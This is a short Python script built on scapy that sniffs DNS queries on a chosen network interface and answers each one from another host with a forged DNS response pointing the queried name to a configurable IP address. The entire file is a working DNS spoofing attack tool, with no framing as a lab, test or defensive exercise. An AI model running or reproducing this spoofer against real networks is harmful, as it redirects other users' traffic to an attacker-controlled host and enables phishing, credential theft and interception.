from scapy.all import send, sniff, get_if_addr
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import IP, UDP

from inputparams import extract_params

destiny = None
interface = None

current_ip = None


def on_dns_packet_detected(pkt):
    try:
        if not pkt.haslayer(DNS):
            return

        if pkt[DNS].qr != 0:
            return

        if pkt[IP].src == current_ip:
            return

        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
        dns = DNS()

        response = ip / udp / dns

        response[DNS].id = pkt[DNS].id
        response[DNS].qr = 1
        response[DNS].qd = pkt[DNS].qd
        response[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=destiny)

        send(response)
    except Exception as e:
        print(repr(e))


if __name__ == '__main__':
    params = extract_params()

    destiny = params['destiny']
    interface = params['interface']

    current_ip = get_if_addr(interface)

    sniff(prn=on_dns_packet_detected, iface=interface)
